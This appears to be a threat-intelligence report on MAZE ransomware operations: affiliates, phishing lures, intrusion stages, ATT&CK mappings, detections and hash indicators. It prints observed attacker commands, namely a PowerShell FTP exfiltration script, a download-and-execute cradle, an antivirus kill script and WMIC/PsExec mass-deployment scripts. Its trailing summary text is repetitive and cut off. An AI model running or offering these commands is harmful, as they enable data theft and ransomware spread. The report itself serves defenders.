https://www.mandiant.com/resources/blog/tactics-techniques-procedures-associated-with-maze-ransomware-incidents;Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents;"Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents, FIN6 activity, implications for OT networks, and other aspects of post-compromise ransomware deployment. Since November 2019, we've seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.The combination of these two damaging intrusion outcomes--dumping sensitive data and disrupting enterprise networks--with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar.VictimologyWe are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).Figure 1: Geographical and industry distribution of alleged MAZE victimsMultiple Actors Involved in MAZE Ransomware Operations IdentifiedMandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement--each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.Figure 2: MAZE ransomware panelMAZE Initially Distributed via Exploit Kits and Spam CampaignsMAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines ""Wichtige informationen uber Steuerruckerstattung"" and ""1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19"" (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.Figure 3: German-language lureOn November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects ""Missed package delivery"" and ""Your AT&T wireless bill is ready to view"" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.Figure 4: AT&T email lureFigure 5: Canada Post email lureShift to Post-Compromise Distribution Maximizes ImpactActors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim's environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.Initial CompromiseThere are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network.An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system.Establish Foothold & Maintain PresenceThe use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations.Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor.Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations.An actor created a new domain account and added it to the domain administrators group.Escalate PrivilegesAlthough Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.Less than two weeks after initial access, the actor downloaded and interacted with an archive named mimi.zip, which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same mimi.zip archive was identified on two domain controllers in the impacted environment.The actor attempted to find files with the word ""password"" within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity.The actor attempted to identify hosts running the KeePass password safe software.Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges.Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services.ReconnaissanceMandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information.Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations.Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'.The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script.Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts.An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe.An actor used the tool smbtools.exe to assess whether accounts could login to systems across the environment.An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration.Lateral MovementAcross the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed.Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation.The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts.An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account.At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019, however, there is no evidence that these attempts were successful.Complete MissionThere was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013.A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident.Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server.An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service.Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility.In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems.Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment.An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion.Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows: A batch script named start.bat was used to execute a series of secondary batch scripts with names such as xaa3x.bat or xab3x.bat. Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted.ImplicationsBased on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our Ransomware Protection and Containment Strategies blog post and the linked white paper.Mandiant Security Validation ActionsOrganizations can validate their security controls against more than 20 MAZE-specific actions with Mandiant Security Validation. Please see our Headline Release Content Updates - April 21, 2020 on the Mandiant Security Validation Customer Portal for more information.A100-877 - Active Directory - BloodHound, CollectionMethod AllA150-006 - Command and Control - BEACON, Check-inA101-030 - Command and Control - MAZE Ransomware, C2 Beacon, Variant 1A101-031 - Command and Control - MAZE Ransomware, C2 Beacon, Variant 2A101-032 - Command and Control - MAZE Ransomware, C2 Beacon, Variant 3A100-878 - Command and Control - MAZE Ransomware, C2 Check-inA100-887 - Command and Control - MAZE, DNS Query 1A100-888 - Command and Control - MAZE, DNS Query 2A100-889 - Command and Control - MAZE, DNS Query 3A100-890 - Command and Control - MAZE, DNS Query 4A100-891 - Command and Control - MAZE, DNS Query 5A100-509 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Github PoCA100-339 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing PageA101-033 - Exploit Kit Activity - Spelevo Exploit Kit, MAZE C2A100-208 - FTP-based Exfil/Upload of PII Data (Various Compression)A104-488 - Host CLI - Collection, Exfiltration: Active Directory Reconnaissance with SharpHound, CollectionMethod AllA104-046 - Host CLI - Collection, Exfiltration: Data from Local Drive using PowerShellA104-090 - Host CLI - Collection, Impact: Creation of a Volume Shadow CopyA104-489 - Host CLI - Collection: Privilege Escalation Check with PowerUp, Invoke-AllChecksA104-037 - Host CLI - Credential Access, Discovery: File & Directory DiscoveryA104-052 - Host CLI - Credential Access: MimikatzA104-167 - Host CLI - Credential Access: Mimikatz (2.1.1)A104-490 - Host CLI - Defense Evasion, Discovery: Terminate Processes, Malware Analysis ToolsA104-491 - Host CLI - Defense Evasion, Persistence: MAZE, Create Target.lnkA104-500 - Host CLI - Discovery, Defense Evasion: Debugger DetectionA104-492 - Host CLI - Discovery, Execution: Antivirus Query with WMI, PowerShellA104-374 - Host CLI - Discovery: Enumerate Active Directory ForestsA104-493 - Host CLI - Discovery: Enumerate Network SharesA104-481 - Host CLI - Discovery: Language Query Using PowerShell, Current UserA104-482 - Host CLI - Discovery: Language Query Using reg queryA104-494 - Host CLI - Discovery: MAZE, Dropping Ransomware Note Burn DirectoryA104-495 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html VariantA104-496 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt VariantA104-027 - Host CLI - Discovery: Process DiscoveryA104-028 - Host CLI - Discovery: Process Discovery with PowerShellA104-029 - Host CLI - Discovery: Remote System DiscoveryA104-153 - Host CLI - Discovery: Security Software Identification with TasklistA104-083 - Host CLI - Discovery: System InfoA104-483 - Host CLI - Exfiltration: PowerShell FTP UploadA104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware MessageA104-227 - Host CLI - Initial Access, Lateral Movement: Replication Through Removable MediaA100-879 - Malicious File Transfer - Adfind.exe, DownloadA150-046 - Malicious File Transfer - BEACON, DownloadA100-880 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp Executable VariantA100-881 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp PowerShell VariantA100-882 - Malicious File Transfer - Bloodhound Ingestor Download, PowerShell VariantA101-037 - Malicious File Transfer - MAZE Download, Variant 1A101-038 - Malicious File Transfer - MAZE Download, Variant 2A101-039 - Malicious File Transfer - MAZE Download, Variant 3A101-040 - Malicious File Transfer - MAZE Download, Variant 4A101-041 - Malicious File Transfer - MAZE Download, Variant 5A101-042 - Malicious File Transfer - MAZE Download, Variant 6A101-043 - Malicious File Transfer - MAZE Download, Variant 7A101-044 - Malicious File Transfer - MAZE Download, Variant 8A101-045 - Malicious File Transfer - MAZE Download, Variant 9A101-034 - Malicious File Transfer - MAZE Dropper Download, Variant 1A101-035 - Malicious File Transfer - MAZE Dropper Download, Variant 2A100-885 - Malicious File Transfer - MAZE Dropper Download, Variant 4A101-036 - Malicious File Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script DownloadA100-284 - Malicious File Transfer - Mimikatz W/ Padding (1MB), DownloadA100-886 - Malicious File Transfer - Rclone.exe, DownloadA100-484 - Scanning Activity - Nmap smb-enum-shares, SMB Share EnumerationDetecting the TechniquesPlatform Signature Name MVX (covers multiple FireEye technologies) Bale Detection FE_Ransomware_Win_MAZE_1 Endpoint Security WMIC SHADOWCOPY DELETE (METHODOLOGY) MAZE RANSOMWARE (FAMILY) Network Security Ransomware.Win.MAZE Ransomware.Maze Ransomware.MazeMITRE ATT&CK MappingsMandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that 'initial access' phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).MAZE Group 1 MITRE ATT&CK MappingATT&CK Tactic Category Techniques Initial Access T1133: External Remote Services T1078: Valid Accounts Execution T1059: Command-Line Interface T1086: PowerShell T1064: Scripting T1035: Service Execution Persistence T1078: Valid Accounts T1050: New Service Privilege Escalation T1078: Valid Accounts Defense Evasion T1078: Valid Accounts T1036: Masquerading T1027: Obfuscated Files or Information T1064: Scripting Credential Access T1110: Brute Force T1003: Credential Dumping Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1016: System Network Configuration Discovery Lateral Movement T1076: Remote Desktop Protocol T1105: Remote File Copy Collection T1005: Data from Local System Command and Control T1043: Commonly Used Port T1105: Remote File Copy T1071: Standard Application Layer Protocol Exfiltration T1002: Data Compressed T1048: Exfiltration Over Alternative Protocol Impact T1486: Data Encrypted for Impact T1489: Service StopMAZE Group 2 MITRE ATT&CK MappingATT&CK Tactic Category Techniques Initial Access T1193: Spearphishing Attachment Execution T1059: Command-Line Interface T1086: PowerShell T1085: Rundll32 T1064: Scripting T1204: User Execution T1028: Windows Remote Management Persistence T1078: Valid Accounts T1050: New Service T1136: Create Account Privilege Escalation T1078: Valid Accounts T1050: New Service Defense Evasion T1078: Valid Accounts T1140: Deobfuscate/Decode Files or Information T1107: File Deletion T1036: Masquerading Credential Access T1003: Credential Dumping T1081: Credentials in Files T1171: LLMNR/NBT-NS Poisoning Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1033: System Owner/User Discovery Lateral Movement T1076: Remote Desktop Protocol T1028: Windows Remote Management Collection T1074: Data Staged T1005: Data from Local System T1039: Data from Network Shared Drive Command and Control T1043: Commonly Used Port T1219: Remote Access Tools T1105: Remote File Copy T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol Exfiltration T1020: Automated Exfiltration T1002: Data Compressed T1048: Exfiltration Over Alternative Protocol Impact T1486: Data Encrypted for ImpactMAZE Group 3 MITRE ATT&CK Mapping (FIN6)ATT&CK Tactic Category Techniques Initial Access T1133: External Remote Services T1078: Valid Accounts Execution T1059: Command-Line Interface T1086: PowerShell T1064: Scripting T1035: Service Execution Persistence T1078: Valid Accounts T1031: Modify Existing Service Privilege Escalation T1055: Process Injection T1078: Valid Accounts Defense Evasion T1055: Process Injection T1078: Valid Accounts T1116: Code Signing T1089: Disabling Security Tools T1202: Indirect Command Execution T1112: Modify Registry T1027: Obfuscated Files or Information T1108: Redundant Access T1064: Scripting Credential Access T1003: Credential Dumping Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery Lateral Movement T1097: Pass the Ticket T1076: Remote Desktop Protocol T1105: Remote File Copy T1077: Windows Admin Shares Collection T1074: Data Staged T1039: Data from Network Shared Drive Command and Control T1043: Commonly Used Port T1219: Remote Access Tools T1105: Remote File Copy T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol Exfiltration T1002: Data Compressed Impact T1486: Data Encrypted for Impact T1490: Inhibit System Recovery T1489: Service StopExample Commands Observed in MAZE Ransomware Incidentsfunction Enum-UsersFolders($PathEnum){$foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinueGet-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinueGet-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinueforeach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) {foreach($SeachDir in $foldersArr) {Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue}}}PowerShell reconnaissance script used to enumerate directories$Dir=""C:/Windows/Temp/""ftp server$ftp = ""ftp://<IP Address>/incoming/""$user = ""<username>""$pass = ""<password>""$webclient = New-Object System.Net.WebClient$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)list every sql server trace fileforeach($item in (dir $Dir ""*.7z"")){""Uploading $item...""$uri = New-Object System.Uri($ftp+$item.Name)$webclient.UploadFile($uri, $item.FullName)}Decoded FTP upload PowerShell scriptpowershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'), Add-FtpFile -ftpFilePath ""ftp://<IP Address>/cobalt_uploads/<file name>"" -localFile ""<local file path>\ <file name> "" -userName ""<username>"" -password ""<password>""Decoded FTP upload PowerShell script[...]echo 7echo 7taskkill /im csrss_tc.exe /ftaskkill /im kwsprod.exe /ftaskkill /im avkwctl.exe /ftaskkill /im rnav.exe /ftaskkill /im crssvc.exe /fsc config CSAuth start= disabledtaskkill /im vsserv.exe /ftaskkill /im ppmcativedetection.exe /f[...]taskkill /im sahookmain.exe /ftaskkill /im mcinfo.exe /freg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /fnetsh advfirewall firewall set rule group=""remote desktop"" new enable=Yec:\windows\temp\sss.exeExcerpt from windows.bat kill scriptstart copy sss.exe \\<internal IP>\c$\windows\temp\start copy sss.exe \\<internal IP>\c$\windows\temp\start copy windows.bat \\<internal IP>\c$\windows\temp\start copy windows.bat \\<internal IP>\c$\windows\temp\start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""c:\windows\temp\sss.exe"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""c:\windows\temp\sss.exe""start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c c:\windows\temp\windows.bat"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c c:\windows\temp\windows.bat""start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\""start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"" start wmic /node:""<internal IP>"" /user:""<DOMAIN\adminaccount>"" /password:""<password>"" process call create ""cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"" start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat start psexec.exe \\<internal IP> -u < DOMAIN\adminaccount> -p ""<password>"" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.batExample commands from MAZE distribution scripts@echo offdel done.txtdel offline.txtrem Loop thru list of computer names in file specified on command-linefor /f %%i in (%1) do call :check_machine %%igoto end:check_machinerem Check to see if machine is up.ping -n 1 %1|Find ""TTL="" >NUL 2>NULif errorlevel 1 goto downecho %1START cmd /c ""copy [Location of MAZE binary] \\%1\c$\windows\temp && exit""timeout 1 > NULecho %1 >> done.txtrem wmic /node:""%1"" process call create ""regsvr32.exe /i C:\windows\temp\[MAZE binary name]"" >> done.txtSTART """" cmd /c ""wmic /node:""%1"" process call create ""regsvr32.exe /i C:\windows\temp\[MAZE binary name]"" && exit""goto end:downrem Report machine downecho %1 >> offline.txt:endExample MAZE distribution scriptIndicators of CompromiseMaze Payloads 064058cf092063a5b69ed8fd2a1a04fe 0f841c6332c89eaa7cac14c9d5b1d35b 108a298b4ed5b4e77541061f32e55751 11308e450b1f17954f531122a56fae3b 15d7dd126391b0e7963c562a6cf3992c 21a563f958b73d453ad91e251b11855c 27c5ecbb94b84c315d56673a851b6cf9 2f78ff32cbb3c478865a88276248d419 335aba8d135cc2e66549080ec9e8c8b7 3bfcba2dd05e1c75f86c008f4d245f62 46b98ee908d08f15137e509e5e69db1b 5774f35d180c0702741a46d98190ff37 5df79164b6d0661277f11691121b1d53 658e9deec68cf5d33ee0779f54806cc2 65cf08ffaf12e47de8cd37098aac5b33 79d137d91be9819930eeb3876e4fbe79 8045b3d2d4a6084f14618b028710ce85 8205a1106ae91d0b0705992d61e84ab2 83b8d994b989f6cbeea3e1a5d68ca5d8 868d604146e7e5cb5995934b085846e3 87239ce48fc8196a5ab66d8562f48f26 89e1ddb8cc86c710ee068d6c6bf300f4 910aa49813ee4cc7e4fa0074db5e454a 9eb13d56c363df67490bcc2149229e4c a0c5b4adbcd9eb6de9d32537b16c423b a3a3495ae2fc83479baeaf1878e1ea84 b02be7a336dcc6635172e0d6ec24c554 b40a9eda37493425782bda4a3d9dad58 b4d6cb4e52bb525ebe43349076a240df b6786f141148925010122819047d1882 b93616a1ea4f4a131cc0507e6c789f94 bd9838d84fd77205011e8b0c2bd711e0 be537a66d01c67076c8491b05866c894 bf2e43ff8542e73c1b27291e0df06afd c3ce5e8075f506e396ee601f2757a2bd d2dda72ff2fbbb89bd871c5fc21ee96a d3eaab616883fcf51dcbdb4769dd86df d552be44a11d831e874e05cadafe04b6 deebbea18401e8b5e83c410c6d3a8b4e dfa4631ec2b8459b1041168b1b1d5105 e57ba11045a4b7bc30bd2d33498ef194 e69a8eb94f65480980deaf1ff5a431a6 ef95c48e750c1a3b1af8f5446fa04f54 f04d404d84be66e64a584d425844b926 f457bb5060543db3146291d8c9ad1001 f5";"Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents, FIN6 activity, implications for OT networks, and other aspects of postcompromise ransomware deployment. Since November 2019, we've seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model. Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed postcompromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a publicfacing website where they post data stolen from victims who refuse to pay an extortion fee. The combination of these two damaging intrusion outcomesdumping sensitive data and disrupting enterprise networkswith a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations. Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar. Victimology We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November Mandiant identified multiple Russianspeaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware. On November 6 and 7, a Maze campaign targeting Germany delivered macroladen documents using the subject lines ""Wichtige informationen uber Steuerruckerstattung"" and ""1&1 Internet AG Ihre Rechnung 19340003422 vom 07.11.19"" (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. MAZE ransomware has been increasingly deployed postcompromise, which provides an opportunity to infect more hosts within a victim's environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the nonrelease of stolen data. Even within these teams, the cyber criminals appear to be taskoriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.Initial CompromiseThere are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:A user downloaded a malicious resumethemed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.An actor logged into an internetfacing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.An actor exploited a misconfiguration on an Internetfacing system. This access enabled the actor to deploy tools to pivot into the internal network.An actor logged into a Citrix web portal account with a weak password. The ITSecurity report states that the actor used weak passwords to gain access to the Citrix web portal account, which enabled the actor to launch a Meterpreter payload on an internal system. Additionally, the actor used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services. In this case, the responsible actors attempted to exfiltrate collected credentials to multiple different cloud file storage services. The actors used a variety of tools and approaches to move laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. MAZE ransomware is a type of malware that encrypts files on a victim's computer and demands a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the 